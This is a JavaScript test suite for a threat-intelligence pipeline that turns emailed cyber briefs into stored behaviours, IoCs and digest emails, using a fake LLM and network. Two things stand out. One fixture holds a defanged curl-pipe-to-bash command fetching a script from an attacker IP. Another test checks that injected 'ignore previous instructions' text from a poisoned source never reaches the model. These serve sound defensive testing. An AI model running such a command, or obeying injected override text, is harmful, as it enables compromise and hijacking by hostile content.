// End-to-end v0 acceptance tests: memory store + fake network + fake LLM. No network, no keys.

import { test, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { memoryStore } from '../lib/store-memory.js';
import { intake } from '../lib/intake.js';
import { driveRuns, advanceRun } from '../lib/pipeline.js';
import {
  fixtureMessage, withHeaders, fakeFetch, installFakeLLM, defaultResponder, captureOutputs,
  NETSCALER_EXTRACTION, emptyExtraction,
} from './helpers.js';

let out;
beforeEach(() => { out = captureOutputs(); });

async function runNetscaler(store, { dry = false, fetchImpl = fakeFetch() } = {}) {
  await intake(store, { dry, messages: [fixtureMessage('netscaler-style.eml')] });
  await driveRuns(store, { fetchImpl });
  return store._tables.runs.at(-1);
}

test('happy path: NetScaler-style story → shell_from_server_process, evidence, P1, email + ✔', async () => {
  const store = memoryStore();
  installFakeLLM(defaultResponder);
  const run = await runNetscaler(store);
  assert.equal(run.stage, 'sent');
  const t = store._tables;
  const ns = t.stories.find((s) => s.title.startsWith('NetScaler ADC post-exploitation'));
  assert.equal(ns.status, 'extracted');
  assert.equal(ns.priority, 1, 'raised to P1 by the exploited+behaviors floor even though the model said 3');
  const b = t.behaviors.filter((x) => x.story_id === ns.id);
  const shell = b.find((x) => x.pattern_kind === 'shell_from_server_process');
  assert.equal(shell.parent, 'nsppe');
  assert.ok(shell.children.includes('whoami') && shell.children.includes('curl') && shell.children.includes('bash'));
  const ev = t.evidence.filter((x) => x.story_id === ns.id);
  assert.ok(ev.some((e) => e.kind === 'command_line' && e.raw.includes('curl -s hxxp://45[.]61[.]139[.]12/x.sh | bash')), 'printed command kept verbatim');
  assert.ok(ev.some((e) => e.kind === 'guidance'));
  // normalization: defanged values canonical, placeholders dropped
  const vals = t.iocs.map((i) => i.value_norm);
  assert.ok(vals.includes('45.61.139.12') && vals.includes('update-check.net'));
  assert.ok(!vals.includes('example.com') && !vals.includes('10.0.0.1'));
  // breach item is outside the deep set → still read, by the light model
  const retailer = t.stories.find((s) => /retailer/i.test(s.brief_text));
  assert.equal(retailer.selected, false);
  assert.equal(retailer.status, 'extracted');
  assert.match(out.emails[0].html, /Quick reads — nothing huntable found/);
  assert.equal(out.emails.length, 1);
  assert.match(out.emails[0].subject, /^Cutsign — 2026-10-21 — \d+ stories, 2 new IoCs, top: NetScaler/);
  assert.match(out.emails[0].html, /update-check\[\.\]net/, 'IoCs defanged in the email');
  assert.match(out.emails[0].html, /Do not paste or forward anything from work/);
  assert.ok(out.discord.some((l) => l.startsWith('Cutsign ✔ 2026-10-21')));
});

test('re-delivering the same Message-ID: no new run, no LLM call, no email', async () => {
  const store = memoryStore();
  const calls = installFakeLLM(defaultResponder);
  await runNetscaler(store);
  const llmBefore = calls.length; const emailsBefore = out.emails.length;
  const c = await intake(store, { messages: [fixtureMessage('netscaler-style.eml')] });
  await driveRuns(store, { fetchImpl: fakeFetch() });
  assert.equal(c.new, 0);
  assert.equal(store._tables.runs.length, 1);
  assert.equal(calls.length, llmBefore);
  assert.equal(out.emails.length, emailsBefore);
});

test('non-allowlisted sender: stored as rejected, Discord warning, nothing else', async () => {
  const store = memoryStore();
  const calls = installFakeLLM(defaultResponder);
  const m = withHeaders('netscaler-style.eml', { From: 'Mallory <mallory@evil.test>', 'Message-ID': '<spoof-1@evil.test>' });
  const c = await intake(store, { messages: [m] });
  await driveRuns(store, { fetchImpl: fakeFetch() });
  assert.equal(c.rejected, 1);
  assert.equal(store._tables.briefs[0].status, 'rejected');
  assert.equal(store._tables.briefs[0].raw_mime, undefined, 'body of a rejected message is not stored');
  assert.equal(store._tables.runs.length, 0);
  assert.equal(calls.length, 0);
  assert.equal(out.emails.length, 0);
  assert.ok(out.discord.some((l) => /rejected .* mallory@evil\.test/.test(l)));
});

test('[TEST] sends and second brief for the same date are ignored', async () => {
  const store = memoryStore();
  installFakeLLM(defaultResponder);
  await runNetscaler(store);
  const c = await intake(store, { messages: [
    withHeaders('netscaler-style.eml', { 'Message-ID': '<t1@x>', Subject: '[TEST] [PIPELINE] Cyber Threat Brief - 2026-10-21' }),
    withHeaders('netscaler-style.eml', { 'Message-ID': '<t2@x>' }),
  ] });
  assert.equal(c.ignored, 2);
  assert.equal(store._tables.runs.length, 1);
});

test('?dry=1: full pipeline writes rows but sends no email', async () => {
  const store = memoryStore();
  installFakeLLM(defaultResponder);
  const run = await runNetscaler(store, { dry: true });
  assert.equal(run.stage, 'sent');
  assert.ok(store._tables.behaviors.length && store._tables.evidence.length && store._tables.iocs.length);
  assert.equal(out.emails.length, 0);
  assert.ok(out.discord.some((l) => l.includes('(dry — no email)')));
});

test('failed fetches (404, timeout, 5 MB) are recorded and the run completes', async () => {
  const store = memoryStore();
  installFakeLLM(defaultResponder);
  const run = await runNetscaler(store);
  assert.equal(run.stage, 'sent');
  const by = (p) => store._tables.sources.find((s) => s.url.endsWith(p));
  assert.equal(by('/404').outcome, 'http_error');
  assert.equal(by('/404').status, 404);
  assert.equal(by('/slow').outcome, 'timeout');
  assert.equal(by('/huge').outcome, 'too_large');
  assert.ok(by('/huge').clean_text.length <= 60_000);
});

test('suspicious source is flagged and contributes nothing to extraction', async () => {
  const store = memoryStore();
  const calls = installFakeLLM(defaultResponder);
  await runNetscaler(store);
  const src = store._tables.sources.find((s) => s.url.endsWith('/poisoned'));
  assert.equal(src.suspicious, true);
  const story = store._tables.stories.find((s) => s.source_urls.some((u) => u.endsWith('/poisoned')));
  assert.deepEqual(story.suspicious_sources, ['https://news.fixture.test/poisoned']);
  for (const c of calls) {
    const all = JSON.stringify(c.messages);
    assert.ok(!all.includes('ignore previous instructions'), 'injected text never reaches the model');
    assert.ok(!all.includes('203.0.113.50'));
  }
  assert.match(out.emails[0].html, /suspicious source excluded|suspicious, excluded/);
});

test('invalid ATT&CK ID: one corrective retry; still-invalid IDs are dropped', async () => {
  const store = memoryStore();
  const bad = structuredClone(NETSCALER_EXTRACTION);
  bad.story.attack_techniques.push('T9999.123');
  bad.behaviors[0].attack_technique = 'T9999.123';
  const calls = installFakeLLM((user, n) => (/nsppe/.test(user) ? bad : emptyExtraction('Other'))); // never corrects itself
  await runNetscaler(store);
  const ns = store._tables.stories.find((s) => s.title.startsWith('NetScaler'));
  assert.ok(!ns.attack_techniques.includes('T9999.123'));
  assert.ok(ns.attack_techniques.includes('T1059.004'));
  assert.equal(store._tables.behaviors.find((b) => b.story_id === ns.id && b.pattern_kind === 'shell_from_server_process').attack_technique, null);
  const nsCalls = calls.filter((c) => c.tier === 'deep' && /nsppe/.test(c.messages[0].content));
  assert.equal(nsCalls.length, 2, 'exactly one retry');
  assert.match(nsCalls[1].messages.at(-1).content, /T9999\.123/);
});

test('schema failure retries once; a story that still fails is marked failed, run continues', async () => {
  const store = memoryStore();
  installFakeLLM((user) => (/nsppe/.test(user) ? NETSCALER_EXTRACTION : { nonsense: true }));
  const run = await runNetscaler(store);
  assert.equal(run.stage, 'sent');
  assert.ok(store._tables.stories.some((s) => s.status === 'failed' && /schema/.test(s.extract_error)));
  assert.ok(store._tables.stories.some((s) => s.status === 'extracted'));
});

test('thrown error at a stage → failed + error + ✖; next tick resumes without duplicates', async () => {
  const store = memoryStore();
  installFakeLLM(defaultResponder);
  // inject a fault: the process "dies" partway through normalize (after some links were written)
  const real = store.linkStoryIoc.bind(store);
  let n = 0;
  store.linkStoryIoc = async (...a) => { if (++n === 2) throw new Error('injected fault'); return real(...a); };
  await intake(store, { messages: [fixtureMessage('netscaler-style.eml')] });
  await driveRuns(store, { fetchImpl: fakeFetch() });
  let run = store._tables.runs[0];
  assert.equal(run.stage, 'failed');
  assert.equal(run.failed_stage, 'normalized');
  assert.match(run.error, /injected fault/);
  assert.ok(out.discord.some((l) => l.startsWith('Cutsign ✖') && l.includes('stage=normalized')));

  store.linkStoryIoc = real;
  const storiesBefore = store._tables.stories.length;
  await driveRuns(store, { fetchImpl: fakeFetch() });
  run = store._tables.runs[0];
  assert.equal(run.stage, 'sent');
  assert.equal(store._tables.stories.length, storiesBefore, 'no duplicate stories');
  assert.ok(store._tables.iocs.every((i) => i.seen_count === 1), 'no double-counted IoCs');
  const keys = store._tables.story_iocs.map((l) => `${l.story_id}|${l.ioc_id}|${l.role}`);
  assert.equal(new Set(keys).size, keys.length, 'no duplicate links');
});

test('time budget: a run yields mid-extract and the next invocation finishes it', async () => {
  const store = memoryStore();
  const calls = installFakeLLM(defaultResponder);
  await intake(store, { messages: [fixtureMessage('netscaler-style.eml')] });
  const run0 = store._tables.runs[0];
  const r1 = await advanceRun(store, run0.id, { fetchImpl: fakeFetch(), deadline: Date.now() + 10 * 60_000 });
  assert.equal(r1, 'sent');
  // second brief, tiny budget → yields at fetch or extract, stage stays accurate
  await intake(store, { messages: [withHeaders('netscaler-style.eml', { 'Message-ID': '<d2@x>', Subject: '[PIPELINE] Cyber Threat Brief - 2026-10-22' })] });
  const run1 = store._tables.runs[1];
  const r2 = await advanceRun(store, run1.id, { fetchImpl: fakeFetch(), deadline: Date.now() + 100_000 });
  assert.equal(r2, 'yielded');
  assert.equal(store._tables.runs[1].stage, 'fetched', 'parsed+fetched done; extract needs 150 s, so it yielded');
  const before = calls.length;
  const r3 = await advanceRun(store, run1.id, { fetchImpl: fakeFetch(), deadline: Date.now() + 10 * 60_000 });
  assert.equal(r3, 'sent');
  assert.ok(calls.length > before);
});

test('an IoC seen on two different days has seen_count 2 and shows as a repeat', async () => {
  const store = memoryStore();
  installFakeLLM(defaultResponder);
  await runNetscaler(store);
  await intake(store, { messages: [withHeaders('netscaler-style.eml', { 'Message-ID': '<day2@x>', Subject: '[PIPELINE] Cyber Threat Brief - 2026-10-22' })] });
  await driveRuns(store, { fetchImpl: fakeFetch() });
  const ip = store._tables.iocs.find((i) => i.value_norm === '45.61.139.12');
  assert.equal(ip.seen_count, 2);
  const second = out.emails.at(-1);
  assert.match(second.subject, /0 new IoCs/);
  assert.match(second.html, /Seen before \(2\)/);
  assert.match(second.html, /seen 2 times, first on/);
});

test('every story failing extraction fails the run loudly', async () => {
  const store = memoryStore();
  installFakeLLM(() => { throw new Error('401 invalid x-api-key'); });
  await runNetscaler(store);
  const run = store._tables.runs[0];
  assert.equal(run.stage, 'failed');
  assert.match(run.error, /every story failed extraction/);
  assert.equal(out.emails.length, 0);
  assert.ok(out.discord.some((l) => l.startsWith('Cutsign ✖')));
});

test('monthly cap: extracts but does not email, warns on Discord', async () => {
  process.env.MAX_MONTHLY_USD = '0.001';
  try {
    const store = memoryStore();
    installFakeLLM(defaultResponder);
    const run = await runNetscaler(store);
    assert.equal(run.stage, 'sent');
    assert.equal(out.emails.length, 0);
    assert.ok(out.discord.some((l) => /over the \$0\.001 cap/.test(l)));
  } finally { delete process.env.MAX_MONTHLY_USD; }
});

test('Resend-delivered mail must pass DKIM; a pass goes through, a fail is rejected loudly', async () => {
  const store = memoryStore();
  const calls = installFakeLLM(defaultResponder);
  const raw = await fixtureMessage('netscaler-style.eml').getRaw();
  const forged = { resendId: 'r1', messageId: '<forged@x>', getRaw: async function () { this.auth = { dkim: 'fail', spf: 'pass' }; return raw.replace(/^Message-ID: .*$/m, 'Message-ID: <forged@x>'); } };
  const real = { resendId: 'r2', messageId: '<fixture-netscaler-style@mail.gmail.com>', getRaw: async function () { this.auth = { dkim: { result: 'pass', domain: 'gmail.com' } }; return raw; } };
  const c = await intake(store, { messages: [forged, real] });
  assert.equal(c.rejected, 1);
  assert.equal(c.accepted, 1);
  assert.equal(store._tables.briefs.find((b) => b.message_id === '<forged@x>').status_reason, 'DKIM did not pass');
  assert.ok(out.discord.some((l) => /DKIM did not pass/.test(l)));
  await driveRuns(store, { fetchImpl: fakeFetch() });
  assert.equal(store._tables.runs.length, 1);
  assert.ok(calls.length > 0);
});
